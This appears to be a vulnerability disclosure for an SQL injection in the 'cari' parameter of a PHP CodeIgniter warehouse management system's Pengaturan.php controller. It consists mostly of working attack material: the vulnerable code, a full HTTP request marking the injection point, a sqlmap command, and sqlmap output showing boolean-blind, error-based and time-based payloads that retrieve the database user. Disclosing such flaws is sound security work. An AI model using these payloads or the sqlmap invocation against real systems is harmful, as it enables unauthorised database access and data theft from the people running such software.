Warehouse Management System SQL Injection on (Pengaturan.php) 

```
/www/ci_wms/application/controllers/Pengaturan.php
```

Vendor Homepage:

```
https://www.sourcecodester.com/php-codeigniter-warehouse-management-system-free-source-code
```

Version: 

```
V1.0
```

Tested on: 

```
PHP, Apache, MySQL
```

Affected Page:

```
/www/ci_wms/application/controllers/Pengaturan.php
```

```
public function pengguna($filter1='', $filter2='', $filter3='')
```

In the line of code `$like_admin[$data['cari']] = $data['q'];`, the value of `$cari` is used as a key for constructing the query. The value of the `cari` parameter is inserted into the SQL query without being processed, leading to a potential risk of SQL injection.

```
			$data['cari']				= ($this->input->post('cari'))?$this->input->post('cari'):'admin_nama';
				$data['q']					= ($this->input->post('q'))?$this->input->post('q'):'';
				$data['halaman']			= (empty($filter2))?1:$filter2;
				$data['batas']				= 10;
				$data['page']				= ($data['halaman']-1) * $data['batas'];
				$where_admin2['admin_status']	= 'A';
				$where_admin3['admin_status']	= 'A';
				$where_admin3['admin_user']	= $this->session->userdata('admin_user');
				$like_admin[$data['cari']]	= $data['q'];
```

Proof of vulnerability:

Request:

```
POST /ci_wms/pengaturan/pengguna HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://localhost
Sec-GPC: 1
Connection: close
Referer: http://localhost/ci_wms/pengaturan/pengguna
Cookie: PHPSESSID=n3ilei2mg7mov24l4ol9itjc14; ci_session=kb62chcvvfncedg3v9fmcoqsco0509u3; sessions=gjhc2t0nht47tauu5vfar2o62ran70hj
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

q=&kirim=&cari=admin_level_kode*
```

```
python3 sqlmap.py -r 1.txt --current-user --batch --dbms mysql
```

```
[10:25:36] [INFO] testing connection to the target URL
got a 303 redirect to 'http://localhost/ci_wms/wp_login'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: q=&kirim=&cari=admin_level_kode AND 4002=4002-- gDDa

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: q=&kirim=&cari=admin_level_kode AND GTID_SUBSET(CONCAT(0x716a7a7a71,(SELECT (ELT(4252=4252,1))),0x71716a6b71),4252)-- TFjz

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: q=&kirim=&cari=admin_level_kode AND (SELECT 5847 FROM (SELECT(SLEEP(5)))gKWg)-- UYjS
---
[10:25:36] [INFO] testing MySQL
[10:25:36] [INFO] confirming MySQL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[10:25:36] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.33, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.0
[10:25:36] [INFO] fetching current user
[10:25:36] [INFO] resumed: 'root@localhost'
current user: 'root@localhost'
```

